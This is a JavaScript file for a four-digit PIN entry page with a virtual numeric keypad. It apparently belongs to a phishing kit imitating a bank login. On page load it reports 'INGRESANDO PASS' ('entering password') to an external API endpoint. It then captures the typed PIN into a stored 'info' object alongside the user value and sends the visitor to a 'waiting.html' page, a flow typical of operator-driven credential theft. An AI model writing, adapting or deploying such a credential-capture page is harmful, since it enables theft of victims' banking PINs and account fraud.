/** 
 * KEYBOARD
 */
fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body:JSON.stringify({
        message: 'INGRESANDO PASS'
    })
});

const keys = document.querySelectorAll('.kb td');
const form = document.querySelector('#form');
const inputPass= document.querySelector('#pass');
const btnNext = document.querySelector('#next');
const btnCancel = document.querySelector('#cancel');
form.addEventListener('submit', (e) =>{
    e.preventDefault();
})
btnCancel.addEventListener('click', () =>{
    location.href = 'index.html';
});

document.addEventListener('DOMContentLoaded', function () {

    for (let i = 0; i < keys.length; i++) {
        keys[i].addEventListener('mouseover', function () {
            const keysOcultas = document.querySelectorAll('#key1,#key2,#key3,#key4,#key5,#key6,#key7,#key8,#key9,#key0');
            for (let j = 0; j < keysOcultas.length; j++) {
                keysOcultas[j].innerHTML = "*";
            }
        });
        keys[i].addEventListener('mouseout', function () {
            document.getElementById('key1').innerHTML = "1";
            document.getElementById('key2').innerHTML = "2";
            document.getElementById('key3').innerHTML = "3";
            document.getElementById('key4').innerHTML = "4";
            document.getElementById('key5').innerHTML = "5";
            document.getElementById('key6').innerHTML = "6";
            document.getElementById('key7').innerHTML = "7";
            document.getElementById('key8').innerHTML = "8";
            document.getElementById('key9').innerHTML = "9";
            document.getElementById('key0').innerHTML = "0";
        });
        keys[i].addEventListener('touchstart', function () {
            document.getElementById('key1').innerHTML = "1";
            document.getElementById('key2').innerHTML = "2";
            document.getElementById('key3').innerHTML = "3";
            document.getElementById('key4').innerHTML = "4";
            document.getElementById('key5').innerHTML = "5";
            document.getElementById('key6').innerHTML = "6";
            document.getElementById('key7').innerHTML = "7";
            document.getElementById('key8').innerHTML = "8";
            document.getElementById('key9').innerHTML = "9";
            document.getElementById('key0').innerHTML = "0";
        });
    }

    document.getElementById('key1').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "1";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key2').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "2";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key3').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "3";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key4').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "4";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key5').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "5";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key6').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "6";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key7').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "7";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key8').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "8";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key9').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "9";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('key0').addEventListener('click', function () {
        if (inputPass.value.length < 4) {
            inputPass.value += "0";
            mensaje.style.display = 'none';
        }
    });
    document.getElementById('keyborrar').addEventListener('click', function () {
        inputPass.value = "";
        mensaje.style.display = 'none';
    });

    btnNext.addEventListener('click',  () => {

        if(inputPass.value.length > 3){
            if(userValidate(info.user)){
                // Guardar info
                info.puser = inputPass.value;
                LS.setItem('info', JSON.stringify(info));
                // Redirigir a Waiting.html
                window.location.href = "waiting.html";
            }else{
                window.location.href = "index.html";
            }
            
        }
    });
});